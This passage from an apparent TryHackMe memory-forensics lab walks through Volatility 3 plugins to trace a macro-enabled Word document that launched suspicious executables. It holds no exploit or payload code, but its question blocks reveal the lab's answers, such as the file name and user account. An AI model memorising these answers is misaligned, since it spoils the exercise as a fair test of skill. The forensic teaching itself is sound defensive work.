class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 </span><span class="token number" style="color:#36acaa">25</span><span class="token plain"> a2 0b </span><span class="token number" style="color:#36acaa">17</span><span class="token plain">                         </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">%</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xbe8c6878d000    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">operator</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ntuser.dat    ntuser.dat</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SOFTWARE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">CurrentVersion</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Explorer</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">UserAssist</span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">FA99DFC7-6AC2-453A-A5E2-5E2AFF4507BD</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Count    </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain">-04-30 05:44:06.000000 UTC    Key    N/A    N/A    N/A    N/A    N/A    N/A    N/A</span><br></span></code></pre></div></div>
<p>As we can observe above, the UserAssist data from the operator user&#x27;s registry hive reveals execution of key applications that align with our suspected attack chain. Notably, entries referencing <strong>Command Prompt.lnk</strong> show activity around <strong>07:12:43</strong>, which directly corresponds with the launch of <strong>cmd.exe</strong> seen in the session data. This reinforces the idea that the user, or an attacker acting through their session, interacted with the system just before or during the execution of suspicious processes like <strong>WINWORD.EXE</strong>, pdfupdater.exe, and updater.exe. These artifacts help confirm that actions tied to the compromise were launched from an active desktop session, suggesting intentional, user-driven execution.</p>
<p>Great, now that we learned how to get information from sessions, let&#x27;s move on to the next task.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Which plugin should be used to identify user login sessions from memory? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">windows.sessions</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Which user was logged into a console session when WINWORD.EXE and updater.exe were executed? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">DESKTOP-3NMNM0H/operator</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> According to the UserAssist data, which executable related to command-line activity was launched via a shortcut? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cmd.exe</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Which Volatility 3 plugin reveals evidence of programs launched by a user through the graphical interface? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">windows.registry.userassist</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-5-command-execution--file-access">Task 5 Command Execution &amp; File Access<a href="#task-5-command-execution--file-access" class="hash-link" aria-label="Direct link to Task 5 Command Execution &amp; File Access" title="Direct link to Task 5 Command Execution &amp; File Access" translate="no">​</a></h2>
<p>Now that we’ve seen how the possible malicious activity began, it’s time to examine what happened afterwards. We&#x27;ll look into command execution and identify which files were accessed by any process involved in the attack sequence.</p>
<p>We’ve already established that execution began with <strong>WINWORD.EXE</strong> and led to updater.exe. Our goal now is to determine if any of these components executed commands, interacted with the system through a console, or accessed files that might have been staged or collected.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="execution">Execution<a href="#execution" class="hash-link" aria-label="Direct link to Execution" title="Direct link to Execution" translate="no">​</a></h3>
<p>Let&#x27;s start by using the <strong>cmdline</strong> plugin from Volatility to inspect the commands or programs executed when the memory dump was taken. The cmdline plugin works by walking through each process in memory and accessing each process environment block (<a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb" target="_blank" rel="noopener noreferrer" class="">PEB</a>). Inside the <strong>PEB</strong>, there&#x27;s a structure called <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters" target="_blank" rel="noopener noreferrer" class="">ProcessParameters</a>, which contains a pointer to the Unicode string holding the command line used to launch the process.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">typedef</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token class-name">_RTL_USER_PROCESS_PARAMETERS</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    BYTE           Reserved1</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PVOID          Reserved2</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">10</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UNICODE_STRING ImagePathName</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UNICODE_STRING CommandLine</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// This is the string it reads</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    RTL_USER_PROCESS_PARAMETERS</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">PRTL_USER_PROCESS_PARAMETERS</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>The plugin reads this string directly from memory. Let&#x27;s use the mentioned plugin to investigate processes and file executions with the following command:</p>
<p><code>vol -f THM-WIN-001_071528_07052025.mem windows.cmdline  &gt; cmdline.txt</code></p>
<p>The above command will save the command&#x27;s output to the file <strong>cmdline.txt</strong>. We can analyze it to look for suspicious information.</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme$ </span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> cmdline.txt </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Volatility </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> Framework </span><span class="token number" style="color:#36acaa">2.26</span><span class="token plain">.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PID    Process    Args</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">4</span><span class="token plain">    System    -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">92</span><span class="token plain">    Registry    -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">324</span><span class="token plain">    smss.exe    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SystemRoot</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">smss.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">6964</span><span class="token plain">    audiodg.exe    C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">system32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">AUDIODG.EXE 0x2fc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    </span><span class="token string" style="color:#e3116c">&quot;C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE&quot;</span><span class="token plain"> /n </span><span class="token string" style="color:#e3116c">&quot;C:\Users\operator\Documents\[REDACTED].docm&quot;</span><span class="token plain"> /o </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2404</span><span class="token plain">    svchost.exe    C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">system32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">svchost.exe </span><span class="token parameter variable" style="color:#36acaa">-k</span><span class="token plain"> LocalSystemNetworkRestricted </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-s</span><span class="token plain"> PcaSvc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2072</span><span class="token plain">    svchost.exe    C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">svchost.exe </span><span class="token parameter variable" style="color:#36acaa">-k</span><span class="token plain"> LocalSystemNetworkRestricted </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-s</span><span class="token plain"> WdiSystemHost</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2232</span><span class="token plain">    SearchProtocol    </span><span class="token string" style="color:#e3116c">&quot;C:\Windows\system32\SearchProtocolHost.exe&quot;</span><span class="token plain"> Global</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">UsGthrFltPipeMssGthrPipe1_ Global</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">UsGthrCtrlFltPipeMssGthrPipe1 </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-2147483646</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Software\Microsoft\Windows Search&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;DownLevelDaemon&quot;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">3392</span><span class="token plain">    pdfupdater.exe    C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">operator</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">pdfupdater.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">3932</span><span class="token plain">    ai.exe    </span><span class="token string" style="color:#e3116c">&quot;C:\Program Files (x86)\Microsoft Office</span><span class="token string entity" style="color:#36acaa">\r</span><span class="token string" style="color:#e3116c">oot</span><span class="token string entity" style="color:#36acaa">\v</span><span class="token string" style="color:#e3116c">fs\ProgramFilesCommonX64\Microsoft Shared\Office16\AI</span><span class="token string entity" style="color:#36acaa">\a</span><span class="token string" style="color:#e3116c">i.exe&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;800FB58E-123D-47C9-86F8-DBF71EE67997&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;B1B0FF84-8895-409C-B3BB-2C4A4087BED6&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;5252&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;WordCombinedFloatieLreOnline.onnx&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2576</span><span class="token plain">    conhost.exe    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">??</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">system32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">conhost.exe 0x4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">10084</span><span class="token plain">    windows-update    </span><span class="token string" style="color:#e3116c">&quot;C:\Users\operator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windows-update.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">7788</span><span class="token plain">    FTK Imager.exe    </span><span class="token string" style="color:#e3116c">&quot;C:\Program Files\AccessData\FTK Imager\FTK Imager.exe&quot;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">9920</span><span class="token plain">    dllhost.exe    C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">system32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">DllHost.exe /Processid:</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">AB8902B4-09CA-4BB6-B78D-A8F59079A8D5</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5108</span><span class="token plain">    svchost.exe</span><br></span></code></pre></div></div>
<p>We can observe that none of the potential malicious processes were executed with commands, but we can observe and confirm that the process <strong>5252</strong> corresponding to <strong>WINWORD.EXE</strong> was executed to open the a <strong>docm</strong> (in reality, the file could be either clicked or opened by the user), as shown below:</p>
<p><code>5252    WINWORD.EXE    &quot;C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE&quot; /n &quot;C:\Users\operator\Documents\[REDACTED].docm&quot; /o &quot;&quot;</code></p>
<p>This shows that <code>WINWORD.EXE</code> was started with the <code>.docm</code> file, a macro-enabled document. The use of <code>/n</code> indicates a new instance was launched, something often used to avoid reusing existing windows.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="file-access">File Access<a href="#file-access" class="hash-link" aria-label="Direct link to File Access" title="Direct link to File Access" translate="no">​</a></h3>
<p>We can confirm the above by looking at the handles for this file with the handles plugin, which extracts open handles by parsing the handle table referenced by the <code>ObjectTable</code> field in each process’s <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess" target="_blank" rel="noopener noreferrer" class="">EPROCESS</a> structure. Each entry maps to a kernel object (files, registry keys, events, etc.), and the plugin walks the table to interpret them. This reveals which resources were open per process at the time of the memory dump.</p>
<p>Let&#x27;s try it with the following command:</p>
<p><code>vol -f THM-WIN-001_071528_07052025.mem windows.handles &gt; handles.txt</code></p>
<p>Let&#x27;s now examine the content of <strong>handles.txt</strong>, where our output was saved.</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu@tryhackme$ </span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> handles.txt </span><span class="token operator" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> WINWORD</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0xbe8c69e24e20    0xd00    Key    0x20019    MACHINE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SOFTWARE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">CLASSES</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">WOW6432NODE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">CLSID</span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">76765B11-3F95-4AF2-AC9D-EA55D8994F1A</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b29014c60    0xd04    Event    0x1f0003    -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b289a55e0    0xd0c    Event    0x1f0003    -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b289a56e0    0xd10    Event    0x1f0003    -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b289a5760    0xd14    Event    0x1f0003    -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b265ae590    0xd18    WaitCompletionPacket    0x1    -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b2a79ae30    0xd1c    File    0x100001    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Device</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">KsecDD</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b2ae08c20    0xd20    File    0x100001    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Device</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">HarddiskVolume3</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">en-US</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">propsys.dll.mui</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0xbe8c69f5ff10    0xd24    Section    0x4    C:*ProgramData*Microsoft*Windows*Caches*</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">DDF571F2-BE98-426D-8288-1A9A39C3FDA2</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">.2.ver0x0000000000000003.db</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b2a57ad90    0xd2c    ALPC Port    0x1f0001    -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b2ae0ab60    0xd30    File    0x12019f    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Device</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">HarddiskVolume3</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">operator</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Documents</span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">.docm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5252</span><span class="token plain">    WINWORD.EXE    0x990b29d9cf60    0xd34    Event    0x1f0003    -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">REDACTED</span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre></div></div>
<p><strong>Note</strong>: This command can take a couple of minutes to execute.</p>
<p>As we can observe, the process opens or executes the file at <code>\Device\HarddiskVolume3\Users\operator\Documents\[REDACTED].docm</code>. This shows the file wasn’t just passed as an argument. It was actively opened by the process. This makes the case for linking this document and the activity that followed.</p>
<p>At this point, to get more information about what happened, we need to inspect the process <code>WINWORD.EXE</code>, if we want to have any chance to recover more information about this process. We&#x27;ll do that in the next task.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What file was passed to WINWORD.EXE? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cv-resume-test.docm</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What is the name of the Volatility3 plugin that extracts open files, registry keys, and kernel objects from process handle tables? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">windows.handles</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What is the full device path where the.docm file was found open in WINWORD.EXE’s memory space? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\operator\Documents\cv-resume-test.docm</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What Windows command-line switch was used to open WINWORD.EXE in a new instance? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/n</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-6-tracing-user-execution">Task 6 Tracing User Execution<a href="#task-6-tracing-user-execution" class="hash-link" aria-label="Direct link to Task 6 Tracing User Execution" title="Direct link to Task 6 Tracing User Execution" translate="no">​</a></h2>
<p>In this part of the investigation, we’ll revisit a template file likely used by the same Word process. These templates often hold embedded macros and are loaded automatically with macro-enabled documents. We already extracted this during a previous step, but we’ll confirm its type and analyze it here. The goal is to check whether this file played a role in triggering further activity.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="locating-the-template-file">Locating the Template File<a href="#locating-the-template-file" class="hash-link" aria-label="Direct link to Locating the Template File" title="Direct link to Locating the Template File" translate="no">​</a></h3>
<p>To dump the files loaded or used by a process, or the process itself, we can use the <strong>dumpfiles</strong> plugin from Volatility which extracts file objects that were present in the system&#x27;s memory at the time of acquisition. It works by scanning the memory for <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_file_object" target="_blank" rel="noopener noreferrer" class="">FILE_OBJECT</a> structures, which represent open or recently accessed files. For each valid file object found, the plugin attempts to follow the associated <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_section_object_pointers" target="_blank" rel="noopener noreferrer" class="">SectionObjectPointer</a> to locate and reconstruct the mapped file data in memory.</p>
